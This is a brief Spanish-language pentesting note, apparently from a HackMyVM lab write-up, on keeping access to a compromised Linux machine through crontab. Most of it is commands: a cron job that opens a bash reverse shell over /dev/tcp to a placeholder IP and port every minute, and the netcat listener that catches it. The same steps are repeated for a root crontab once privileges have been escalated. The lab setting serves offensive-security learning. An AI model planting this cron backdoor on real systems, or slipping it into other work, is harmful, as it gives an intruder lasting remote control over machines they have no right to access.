- Tags : #persistencia #cron_tab #recurso_hackmyvm

**Recurso**: Maquina Friendly hackmyvm.eu

```bash

crontab -e

#Agregamos una tarea

* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'   
#Establecer una conexion cada minuto a la ip y puerto especificado

#Asi cuando nos pongamoa a escuchar por el puerto indicado con nc obtendremos la conexion

nc -nlpv port
```

**Persistencia crontab como root**

```bash
#Primero deberiamos escalar privilegios hasta ser un root del sistema para luego crear la persistencia

crontab -e

#Agregamos una tarea

* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'   
#Establecer una conexion cada minuto a la ip y puerto especificado

#Asi cuando nos pongamoa a escuchar por el puerto indicado con nc obtendremos la conexion

nc -nlpv port
```